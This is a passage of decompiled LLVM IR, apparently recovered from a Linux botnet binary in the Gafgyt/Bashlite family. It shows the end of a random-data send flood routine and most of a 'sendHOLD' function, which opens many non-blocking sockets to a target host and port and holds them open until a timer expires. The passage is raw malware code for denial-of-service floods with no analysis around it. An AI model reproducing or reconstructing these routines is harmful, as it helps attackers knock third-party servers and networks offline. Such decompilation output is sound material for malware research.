  store i8 2, i8* %v5_804ed86, align 4
  br label %dec_label_pc_804efe5

dec_label_pc_804ef59:                             ; preds = %dec_label_pc_804ee67
  %v13_804ef59 = icmp eq i32 %v5_804eed8, -1
  %v1_804ef5d = icmp eq i1 %v13_804ef59, false
  br i1 %v1_804ef5d, label %dec_label_pc_804efe5, label %dec_label_pc_804ef63

dec_label_pc_804ef63:                             ; preds = %dec_label_pc_804ef59
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v5_804ef69 = load i32, i32* %v4_804ee86, align 8
  store i32 %v5_804ef69, i32* %eax.global-to-local, align 4
  %v2_804ef6f = add i32 %v0_804eedd, 16
  %v3_804ef6f = inttoptr i32 %v2_804ef6f to i32*
  store i32 %v5_804ef69, i32* %v3_804ef6f, align 4
  %v1_804ef70 = call i32 @__libc_close(i32 %v5_804eed8)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ed86, align 4
  br label %dec_label_pc_804efe5

dec_label_pc_804ef85:                             ; preds = %dec_label_pc_804eda4
  %v0_804ef85 = load i32, i32* @esp, align 4
  %v1_804ef85 = add i32 %v0_804ef85, -4
  %v2_804ef85 = inttoptr i32 %v1_804ef85 to i32*
  store i32 1024, i32* %v2_804ef85, align 4
  %v5_804ef8a = add i32 %v0_804ef85, -8
  %v6_804ef8a = inttoptr i32 %v5_804ef8a to i32*
  store i32 %v1_804ed38, i32* %v6_804ef8a, align 4
  %v2_804ef8d = inttoptr i32 %v7_804ed86 to i8*
  %v3_804ef8d = call i32 @makeRandomStr(i8* %v2_804ef8d, i32 %v12_804ec71)
  %v0_804ef92 = load i32, i32* @esp, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v3_804ef9b = add i32 %v2_804ed86, %v2_804ed04
  %v4_804ef9b = inttoptr i32 %v3_804ef9b to i32*
  %v5_804ef9b = load i32, i32* %v4_804ef9b, align 8
  store i32 %v5_804ef9b, i32* %eax.global-to-local, align 4
  %v1_804ef9e = add i32 %v0_804ef92, 4
  %v2_804ef9e = inttoptr i32 %v1_804ef9e to i32*
  store i32 16384, i32* %v2_804ef9e, align 4
  %v2_804efa3 = inttoptr i32 %v0_804ef92 to i32*
  store i32 1024, i32* %v2_804efa3, align 4
  %v5_804efa8 = add i32 %v0_804ef92, -4
  %v6_804efa8 = inttoptr i32 %v5_804efa8 to i32*
  store i32 %v1_804ed38, i32* %v6_804efa8, align 4
  %v0_804efab = load i32, i32* %eax.global-to-local, align 4
  %v2_804efab = add i32 %v0_804ef92, -8
  %v3_804efab = inttoptr i32 %v2_804efab to i32*
  store i32 %v0_804efab, i32* %v3_804efab, align 4
  %v0_804efac = load i32, i32* %stack_var_-200, align 4
  %v1_804efac = load i32, i32* %stack_var_-196, align 4
  %v3_804efac = load i32, i32* %stack_var_-188, align 4
  %v4_804efac = call i32 @__libc_send(i32 %v0_804efac, i32 %v1_804efac, i32 %stack_var_-192.139, i32 %v3_804efac)
  store i32 %v4_804efac, i32* %eax.global-to-local, align 4
  %v10_804efb4 = icmp eq i32 %v4_804efac, -1
  %v1_804efb7 = icmp eq i1 %v10_804efb4, false
  br i1 %v1_804efb7, label %dec_label_pc_804efe5, label %dec_label_pc_804efb9

dec_label_pc_804efb9:                             ; preds = %dec_label_pc_804ef85
  %v0_804efb9 = load i32, i32* %stack_var_-200, align 4
  %v1_804efb9 = call i32 @__errno_location(i32 %v0_804efb9)
  store i32 %v1_804efb9, i32* %eax.global-to-local, align 4
  %v1_804efbe = inttoptr i32 %v1_804efb9 to i32*
  %v2_804efbe = load i32, i32* %v1_804efbe, align 4
  store i32 %v2_804efbe, i32* %eax.global-to-local, align 4
  %v9_804efc0 = icmp eq i32 %v2_804efbe, 11
  br i1 %v9_804efc0, label %dec_label_pc_804efe5, label %dec_label_pc_804efc5

dec_label_pc_804efc5:                             ; preds = %dec_label_pc_804efb9
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v5_804efcb = load i32, i32* %v4_804ef9b, align 8
  store i32 %v5_804efcb, i32* %eax.global-to-local, align 4
  %v0_804efce = load i32, i32* @esp, align 4
  %v2_804efd1 = add i32 %v0_804efce, -16
  %v3_804efd1 = inttoptr i32 %v2_804efd1 to i32*
  store i32 %v5_804efcb, i32* %v3_804efd1, align 4
  %v0_804efd2 = load i32, i32* %stack_var_-200, align 4
  %v1_804efd2 = call i32 @__libc_close(i32 %v0_804efd2)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ed86, align 4
  br label %dec_label_pc_804efe5

dec_label_pc_804efe5:                             ; preds = %dec_label_pc_804edb1, %dec_label_pc_804efb9, %dec_label_pc_804ef85, %dec_label_pc_804ef59, %dec_label_pc_804ef63, %dec_label_pc_804ef49, %dec_label_pc_804ef24, %dec_label_pc_804ee57, %dec_label_pc_804ee3d, %dec_label_pc_804efc5
  %stack_var_-192.0 = phi i32 [ 10000, %dec_label_pc_804ef59 ], [ 10000, %dec_label_pc_804ef63 ], [ 10000, %dec_label_pc_804ef49 ], [ 10000, %dec_label_pc_804ef24 ], [ %stack_var_-192.139, %dec_label_pc_804ef85 ], [ %stack_var_-192.139, %dec_label_pc_804efb9 ], [ %stack_var_-192.139, %dec_label_pc_804efc5 ], [ %stack_var_-192.139, %dec_label_pc_804ee3d ], [ %stack_var_-192.139, %dec_label_pc_804ee57 ], [ %stack_var_-192.139, %dec_label_pc_804edb1 ]
  %v4_804efe5 = add nuw nsw i32 %storemerge40, 1
  store i32 %v4_804efe5, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804efe5, %v2_804ec8d
  br i1 %exitcond, label %dec_label_pc_804efe8.dec_label_pc_804eff4.loopexit_crit_edge, label %dec_label_pc_804ed80

dec_label_pc_804efe8.dec_label_pc_804eff4.loopexit_crit_edge: ; preds = %dec_label_pc_804efe5
  %v0_804eff4.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eff4

dec_label_pc_804eff4:                             ; preds = %dec_label_pc_804efe8.preheader, %dec_label_pc_804efe8.dec_label_pc_804eff4.loopexit_crit_edge, %dec_label_pc_804ecce
  %v0_804eff4 = phi i32 [ %v1_804ed66, %dec_label_pc_804ecce ], [ %v0_804eff4.pre.pre, %dec_label_pc_804efe8.dec_label_pc_804eff4.loopexit_crit_edge ], [ %v1_804effe, %dec_label_pc_804efe8.preheader ]
  %stack_var_-192.2 = phi i32 [ %tmp4, %dec_label_pc_804ecce ], [ %stack_var_-192.0, %dec_label_pc_804efe8.dec_label_pc_804eff4.loopexit_crit_edge ], [ %stack_var_-192.2, %dec_label_pc_804efe8.preheader ]
  %stack_var_-36.0 = phi i32 [ %tmp8, %dec_label_pc_804ecce ], [ %v2_804ec8d, %dec_label_pc_804efe8.dec_label_pc_804eff4.loopexit_crit_edge ], [ 0, %dec_label_pc_804efe8.preheader ]
  %v1_804eff7 = add i32 %v0_804eff4, -16
  %v2_804eff7 = inttoptr i32 %v1_804eff7 to i32*
  store i32 0, i32* %v2_804eff7, align 4
  %v1_804eff9 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_804eff9 = call i32 @__GI_time(i32* %v1_804eff9)
  store i32 %v2_804eff9, i32* %eax.global-to-local, align 4
  %v5_804f004 = icmp slt i32 %v2_804eff9, %v5_804ed69
  br i1 %v5_804f004, label %dec_label_pc_804efe8.preheader, label %dec_label_pc_804f00a

dec_label_pc_804efe8.preheader:                   ; preds = %dec_label_pc_804eff4
  %v0_804effe = load i32, i32* @esp, align 4
  %v1_804effe = add i32 %v0_804effe, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804efee38, label %dec_label_pc_804ed80, label %dec_label_pc_804eff4

dec_label_pc_804f00a:                             ; preds = %dec_label_pc_804eff4, %entry
  %v0_804f016 = phi i32 [ %v3_804ecbd, %entry ], [ %v2_804eff9, %dec_label_pc_804eff4 ]
  %v2_804f013 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f013, i32* @ebx, align 4
  store i32 %v0_804ec6f, i32* @edi, align 4
  ret i32 %v0_804f016

; uselistorder directives
  uselistorder i32 %v4_804efe5, { 1, 2, 0 }
  uselistorder i32 %stack_var_-192.0, { 1, 0 }
  uselistorder i32 %v0_804ef92, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804eedd, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_804eed8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804ee97, { 1, 0 }
  uselistorder i32* %v4_804ee86, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_804edf1, { 2, 0, 1 }
  uselistorder i32 %v7_804ed86, { 7, 2, 1, 3, 4, 5, 6, 8, 0 }
  uselistorder i8* %v5_804ed86, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-192.139, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge40, { 0, 13, 12, 11, 7, 6, 10, 9, 8, 5, 4, 3, 19, 18, 17, 16, 15, 14, 20, 1, 2 }
  uselistorder i32 %v2_804ed21, { 1, 0 }
  uselistorder i32 %v2_804ed04, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 4, 5 }
  uselistorder i32 %v1_804ec9b, { 1, 0 }
  uselistorder i32 %v2_804ec8d, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804ec7f, { 1, 0, 2 }
  uselistorder i32 %v12_804ec71, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 0, 4 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-200, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %stack_var_-204, { 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 52, 43, 42, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder label %dec_label_pc_804efe5, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f01a = load i32, i32* @edi, align 4
  %v0_804f01b = load i32, i32* @ebx, align 4
  store i32 %v0_804f01b, i32* %stack_var_-12, align 4
  %v12_804f01c = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_804f01c, i32* %eax.global-to-local, align 4
  %v1_804f02a = call i32 @getdtablesize(i32 %v12_804f01c)
  store i32 %v1_804f02a, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804f02a, 0
  %v2_804f033 = zext i1 %tmp to i32
  %v2_804f036 = add i32 %v2_804f033, %v1_804f02a
  %v2_804f038 = sdiv i32 %v2_804f036, 2
  store i32 2, i32* %stack_var_-68, align 4
  %v1_804f046 = urem i32 %arg2, 65536
  store i32 %v1_804f046, i32* %eax.global-to-local, align 4
  %v1_804f04f = call i32 @htons(i32 %v1_804f046)
  %v2_804f05e = ptrtoint i32* %stack_var_-68 to i32
  %v15_804f061 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804f061, i32* %eax.global-to-local, align 4
  %v3_804f068 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804f068, i32* %eax.global-to-local, align 4
  %v1_804f070 = icmp eq i32 %v3_804f068, 0
  br i1 %v1_804f070, label %dec_label_pc_804f079, label %dec_label_pc_804f3fa

dec_label_pc_804f079:                             ; preds = %entry
  %v2_804f08f = mul i32 %v2_804f038, 8
  %v1_804f095 = add i32 %v2_804f08f, 30
  %v2_804f098 = and i32 %v1_804f095, -16
  %v2_804f09e = sub i32 %v12_804f01c, %v2_804f098
  %v1_804f0ac = add i32 %v2_804f09e, 15
  %v2_804f0af = and i32 %v1_804f0ac, -16
  %v2_804f0cc = mul i32 %v2_804f038, 5
  store i32 %v2_804f0cc, i32* %edx.global-to-local, align 4
  %v1_804f0d2 = inttoptr i32 %v2_804f0af to i8*
  store i32 %v2_804f0af, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804f0d7 = and i32 %v1_804f0ac, -256
  store i32 %v1_804f0d7, i32* %eax.global-to-local, align 4
  %v5_804f0d9 = call i8* @_memset(i8* %v1_804f0d2, i32 %v1_804f0d7, i32 %v2_804f0cc)
  %v0_804f0db = load i32, i32* @esp, align 4
  %v1_804f0de = add i32 %v0_804f0db, -16
  %v2_804f0de = inttoptr i32 %v1_804f0de to i32*
  store i32 1024, i32* %v2_804f0de, align 4
  %v1_804f0e3 = call i32 @malloc(i32 %v2_804f0af)
  %v0_804f0e8 = load i32, i32* @esp, align 4
  store i32 %v1_804f0e3, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804f0fb = add i32 %v0_804f0e8, 8
  %v3_804f0fb = inttoptr i32 %v2_804f0fb to i32*
  store i32 1024, i32* %v3_804f0fb, align 4
  %v1_804f0fc = add i32 %v0_804f0e8, 4
  %v2_804f0fc = inttoptr i32 %v1_804f0fc to i32*
  store i32 0, i32* %v2_804f0fc, align 4
  %v0_804f0fe = load i32, i32* %edx.global-to-local, align 4
  %v3_804f0fe = inttoptr i32 %v0_804f0e8 to i32*
  store i32 %v0_804f0fe, i32* %v3_804f0fe, align 4
  %v3_804f0ff = inttoptr i32 %v1_804f0e3 to i8*
  %v4_804f0ff = call i32 @__GI_memset(i8* %v3_804f0ff, i32 %tmp11, i32 %tmp8)
  store i32 %v4_804f0ff, i32* %eax.global-to-local, align 4
  %v0_804f104 = load i32, i32* @esp, align 4
  %v2_804f10a = inttoptr i32 %v0_804f104 to i32*
  store i32 0, i32* %v2_804f10a, align 4
  %v1_804f10c = inttoptr i32 %v1_804f0e3 to i32*
  %v2_804f10c = call i32 @__GI_time(i32* %v1_804f10c)
  %v0_804f111 = load i32, i32* @esp, align 4
  %v1_804f111 = add i32 %v0_804f111, 16
  %v5_804f114 = add i32 %v2_804f10c, %arg3
  store i32 %v5_804f114, i32* %eax.global-to-local, align 4
  %v3_804f131 = or i32 %v2_804f0af, 4
  %v2_804f21c = ptrtoint i32* %stack_var_-196 to i32
  %tmp37 = bitcast i32* %stack_var_-196 to i8*
  %v2_804f270 = ptrtoint i32* %stack_var_-204 to i32
  %v2_804f2aa = ptrtoint i32* %stack_var_-208 to i32
  %v2_804f2b1 = ptrtoint i32* %stack_var_-212 to i32
  %v5_804f3de40 = icmp sgt i32 %v2_804f036, 1
  br label %dec_label_pc_804f3e4

dec_label_pc_804f12b:                             ; preds = %dec_label_pc_804f3d8.preheader, %dec_label_pc_804f3d5
  %storemerge41 = phi i32 [ %v4_804f3d5, %dec_label_pc_804f3d5 ], [ 0, %dec_label_pc_804f3d8.preheader ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804f0af, i32* %edx.global-to-local, align 4
  %v2_804f131 = mul i32 %storemerge41, 8
  %v4_804f131 = add i32 %v2_804f131, %v3_804f131
  %v5_804f131 = inttoptr i32 %v4_804f131 to i8*
  %v6_804f131 = load i8, i8* %v5_804f131, align 4
  %v7_804f131 = zext i8 %v6_804f131 to i32
  %v9_804f131 = and i32 %storemerge41, -256
  %v10_804f131 = or i32 %v7_804f131, %v9_804f131
  store i32 %v10_804f131, i32* %eax.global-to-local, align 4
  store i32 %v7_804f131, i32* %edx.global-to-local, align 4
  %v8_804f142 = icmp eq i8 %v6_804f131, 0
  %v12_804f142 = icmp eq i8 %v6_804f131, 1
  br i1 %v12_804f142, label %dec_label_pc_804f212, label %dec_label_pc_804f14f

dec_label_pc_804f14f:                             ; preds = %dec_label_pc_804f12b
  %v12_804f14f = icmp eq i8 %v6_804f131, 2
  br i1 %v12_804f14f, label %dec_label_pc_804f333, label %dec_label_pc_804f15c

dec_label_pc_804f15c:                             ; preds = %dec_label_pc_804f14f
  br i1 %v8_804f142, label %dec_label_pc_804f16a, label %dec_label_pc_804f3d5

dec_label_pc_804f16a:                             ; preds = %dec_label_pc_804f15c
  store i32 %storemerge41, i32* @ebx, align 4
  %v0_804f16d = load i32, i32* @esp, align 4
  %v1_804f170 = add i32 %v0_804f16d, -8
  %v2_804f170 = inttoptr i32 %v1_804f170 to i32*
  store i32 0, i32* %v2_804f170, align 4
  %v1_804f172 = add i32 %v0_804f16d, -12
  %v2_804f172 = inttoptr i32 %v1_804f172 to i32*
  store i32 1, i32* %v2_804f172, align 4
  %v1_804f174 = add i32 %v0_804f16d, -16
  %v2_804f174 = inttoptr i32 %v1_804f174 to i32*
  store i32 2, i32* %v2_804f174, align 4
  %v3_804f176 = call i32 @socket(i32 %v7_804f131, i32 %v12_804f01c, i32 ptrtoint (i32* @0 to i32))
  %v2_804f183 = load i32, i32* @ebx, align 4
  %v3_804f183 = mul i32 %v2_804f183, 8
  %v4_804f183 = add i32 %v3_804f183, %v2_804f0af
  %v5_804f183 = inttoptr i32 %v4_804f183 to i32*
  store i32 %v3_804f176, i32* %v5_804f183, align 8
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v3_804f18c = add i32 %v2_804f131, %v2_804f0af
  %v4_804f18c = inttoptr i32 %v3_804f18c to i32*
  %v5_804f18c = load i32, i32* %v4_804f18c, align 8
  store i32 %v5_804f18c, i32* %eax.global-to-local, align 4
  %v0_804f18f = load i32, i32* @esp, align 4
  %v1_804f192 = add i32 %v0_804f18f, -8
  %v2_804f192 = inttoptr i32 %v1_804f192 to i32*
  store i32 0, i32* %v2_804f192, align 4
  %v1_804f194 = add i32 %v0_804f18f, -12
  %v2_804f194 = inttoptr i32 %v1_804f194 to i32*
  store i32 3, i32* %v2_804f194, align 4
  %v0_804f196 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f196 = add i32 %v0_804f18f, -16
  %v3_804f196 = inttoptr i32 %v2_804f196 to i32*
  store i32 %v0_804f196, i32* %v3_804f196, align 4
  %v3_804f197 = call i32 @__libc_fcntl(i32 %v7_804f131, i32 %v12_804f01c, i32 ptrtoint (i32* @0 to i32))
  %v0_804f19c = load i32, i32* @esp, align 4
  %v12_804f1a1 = or i32 %v3_804f197, 2048
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f1aa = load i32, i32* %v4_804f18c, align 8
  store i32 %v5_804f1aa, i32* %eax.global-to-local, align 4
  %v2_804f1b0 = add i32 %v0_804f19c, 8
  %v3_804f1b0 = inttoptr i32 %v2_804f1b0 to i32*
  store i32 %v12_804f1a1, i32* %v3_804f1b0, align 4
  %v1_804f1b1 = add i32 %v0_804f19c, 4
  %v2_804f1b1 = inttoptr i32 %v1_804f1b1 to i32*
  store i32 4, i32* %v2_804f1b1, align 4
  %v0_804f1b3 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f1b3 = inttoptr i32 %v0_804f19c to i32*
  store i32 %v0_804f1b3, i32* %v3_804f1b3, align 4
  %v3_804f1b4 = call i32 @__libc_fcntl(i32 %v7_804f131, i32 %v12_804f01c, i32 ptrtoint (i32* @0 to i32))
  %v0_804f1b9 = load i32, i32* @esp, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f1c5 = load i32, i32* %v4_804f18c, align 8
  store i32 %v5_804f1c5, i32* %eax.global-to-local, align 4
  %v1_804f1cb = add i32 %v0_804f1b9, 8
  %v2_804f1cb = inttoptr i32 %v1_804f1cb to i32*
  store i32 16, i32* %v2_804f1cb, align 4
  %v2_804f1cd = add i32 %v0_804f1b9, 4
  %v3_804f1cd = inttoptr i32 %v2_804f1cd to i32*
  store i32 %v2_804f05e, i32* %v3_804f1cd, align 4
  %v0_804f1ce = load i32, i32* %eax.global-to-local, align 4
  %v3_804f1ce = inttoptr i32 %v0_804f1b9 to i32*
  store i32 %v0_804f1ce, i32* %v3_804f1ce, align 4
  %v3_804f1cf = call i32 @__libc_connect(i32 %v7_804f131, i32 %v12_804f01c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f1cf, i32* %eax.global-to-local, align 4
  %v0_804f1d4 = load i32, i32* @esp, align 4
  %v1_804f1d4 = add i32 %v0_804f1d4, 16
  %v10_804f1d7 = icmp eq i32 %v3_804f1cf, -1
  %v1_804f1da = icmp eq i1 %v10_804f1d7, false
  br i1 %v1_804f1da, label %dec_label_pc_804f1e8, label %dec_label_pc_804f1dc

dec_label_pc_804f1dc:                             ; preds = %dec_label_pc_804f16a
  %v1_804f1dc = call i32 @__errno_location(i32 %v7_804f131)
  store i32 %v1_804f1dc, i32* %eax.global-to-local, align 4
  %v1_804f1e1 = inttoptr i32 %v1_804f1dc to i32*
  %v2_804f1e1 = load i32, i32* %v1_804f1e1, align 4
  store i32 %v2_804f1e1, i32* %eax.global-to-local, align 4
  %v9_804f1e3 = icmp eq i32 %v2_804f1e1, 115
  br i1 %v9_804f1e3, label %dec_label_pc_804f202, label %dec_label_pc_804f1dc.dec_label_pc_804f1e8_crit_edge

dec_label_pc_804f1dc.dec_label_pc_804f1e8_crit_edge: ; preds = %dec_label_pc_804f1dc
  %v0_804f1f1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f1e8

dec_label_pc_804f1e8:                             ; preds = %dec_label_pc_804f1dc.dec_label_pc_804f1e8_crit_edge, %dec_label_pc_804f16a
  %v0_804f1f1 = phi i32 [ %v0_804f1f1.pre, %dec_label_pc_804f1dc.dec_label_pc_804f1e8_crit_edge ], [ %v1_804f1d4, %dec_label_pc_804f16a ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804f0af, i32* %edx.global-to-local, align 4
  %v5_804f1ee = load i32, i32* %v4_804f18c, align 8
  store i32 %v5_804f1ee, i32* %eax.global-to-local, align 4
  %v2_804f1f4 = add i32 %v0_804f1f1, -16
  %v3_804f1f4 = inttoptr i32 %v2_804f1f4 to i32*
  store i32 %v5_804f1ee, i32* %v3_804f1f4, align 4
  %v1_804f1f5 = call i32 @__libc_close(i32 %v7_804f131)
  store i32 %v1_804f1f5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f3d5

dec_label_pc_804f202:                             ; preds = %dec_label_pc_804f1dc
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804f131, align 4
  br label %dec_label_pc_804f3d5

dec_label_pc_804f212:                             ; preds = %dec_label_pc_804f12b
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804f21c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f223 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v3_804f231 = add i32 %v2_804f131, %v2_804f0af
  %v4_804f231 = inttoptr i32 %v3_804f231 to i32*
  %v5_804f231 = load i32, i32* %v4_804f231, align 8
  %v2_804f236 = udiv i32 %v5_804f231, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f23f = load i32, i32* %v4_804f231, align 8
  %v1_804f242 = urem i32 %v5_804f23f, 32
  store i32 %v1_804f242, i32* %eax.global-to-local, align 4
  %v0_804f245 = load i32, i32* @ebp, align 4
  %v2_804f245 = mul nuw nsw i32 %v2_804f236, 4
  %v3_804f245 = add nsw i32 %v2_804f245, -192
  %v4_804f245 = add i32 %v3_804f245, %v0_804f245
  %v5_804f245 = inttoptr i32 %v4_804f245 to i32*
  %v6_804f245 = load i32, i32* %v5_804f245, align 4
  %v9_804f245 = shl i32 1, %v1_804f242
  %v12_804f245 = or i32 %v6_804f245, %v9_804f245
  store i32 %v12_804f245, i32* %v5_804f245, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f267 = load i32, i32* %v4_804f231, align 8
  %v1_804f26a = add i32 %v5_804f267, 1
  store i32 %v1_804f26a, i32* %edx.global-to-local, align 4
  %v0_804f26d = load i32, i32* @esp, align 4
  %v2_804f276 = add i32 %v0_804f26d, -16
  %v3_804f276 = inttoptr i32 %v2_804f276 to i32*
  store i32 %v2_804f270, i32* %v3_804f276, align 4
  %v1_804f277 = add i32 %v0_804f26d, -20
  %v2_804f277 = inttoptr i32 %v1_804f277 to i32*
  store i32 0, i32* %v2_804f277, align 4
  store i32 %v2_804f21c, i32* %eax.global-to-local, align 4
  %v2_804f27f = add i32 %v0_804f26d, -24
  %v3_804f27f = inttoptr i32 %v2_804f27f to i32*
  store i32 %v2_804f21c, i32* %v3_804f27f, align 4
  %v1_804f280 = add i32 %v0_804f26d, -28
  %v2_804f280 = inttoptr i32 %v1_804f280 to i32*
  store i32 0, i32* %v2_804f280, align 4
  %v0_804f282 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f282 = add i32 %v0_804f26d, -32
  %v3_804f282 = inttoptr i32 %v2_804f282 to i32*
  store i32 %v0_804f282, i32* %v3_804f282, align 4
  %v0_804f283 = load i32, i32* %stack_var_-204, align 4
  %v2_804f283 = load i32, i32* %stack_var_-196, align 4
  %v5_804f283 = call i32 @__libc_select(i32 %v0_804f283, i32 10000, i32 %v2_804f283, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f283, i32* %eax.global-to-local, align 4
  %v0_804f288 = load i32, i32* @esp, align 4
  %v12_804f28e = icmp eq i32 %v5_804f283, 1
  %v1_804f292 = icmp eq i1 %v12_804f28e, false
  br i1 %v1_804f292, label %dec_label_pc_804f304, label %dec_label_pc_804f294

dec_label_pc_804f294:                             ; preds = %dec_label_pc_804f212
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f2a4 = load i32, i32* %v4_804f231, align 8
  store i32 %v5_804f2a4, i32* %edx.global-to-local, align 4
  %v2_804f2b0 = add i32 %v0_804f288, 16
  %v3_804f2b0 = inttoptr i32 %v2_804f2b0 to i32*
  store i32 %v2_804f2aa, i32* %v3_804f2b0, align 4
  store i32 %v2_804f2b1, i32* %eax.global-to-local, align 4
  %v2_804f2b7 = add i32 %v0_804f288, 12
  %v3_804f2b7 = inttoptr i32 %v2_804f2b7 to i32*
  store i32 %v2_804f2b1, i32* %v3_804f2b7, align 4
  %v1_804f2b8 = add i32 %v0_804f288, 8
  %v2_804f2b8 = inttoptr i32 %v1_804f2b8 to i32*
  store i32 4, i32* %v2_804f2b8, align 4
  %v1_804f2ba = add i32 %v0_804f288, 4
  %v2_804f2ba = inttoptr i32 %v1_804f2ba to i32*
  store i32 1, i32* %v2_804f2ba, align 4
  %v0_804f2bc = load i32, i32* %edx.global-to-local, align 4
  %v3_804f2bc = inttoptr i32 %v0_804f288 to i32*
  store i32 %v0_804f2bc, i32* %v3_804f2bc, align 4
  %v0_804f2bd = load i32, i32* %stack_var_-208, align 4
  %v1_804f2bd = load i32, i32* %stack_var_-204, align 4
  %v3_804f2bd = load i32, i32* %stack_var_-196, align 4
  %v5_804f2bd = call i32 @getsockopt(i32 %v0_804f2bd, i32 %v1_804f2bd, i32 10000, i32 %v3_804f2bd, i32 ptrtoint (i32* @0 to i32))
  %v0_804f2c2 = load i32, i32* @esp, align 4
  %v3_804f2c5 = load i32, i32* %stack_var_-212, align 4
  %v1_804f2cb = icmp eq i32 %v3_804f2c5, 0
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  br i1 %v1_804f2cb, label %dec_label_pc_804f2f4, label %dec_label_pc_804f2cf

dec_label_pc_804f2cf:                             ; preds = %dec_label_pc_804f294
  %v5_804f2d5 = load i32, i32* %v4_804f231, align 8
  store i32 %v5_804f2d5, i32* %eax.global-to-local, align 4
  %v2_804f2db = add i32 %v0_804f2c2, 16
  %v3_804f2db = inttoptr i32 %v2_804f2db to i32*
  store i32 %v5_804f2d5, i32* %v3_804f2db, align 4
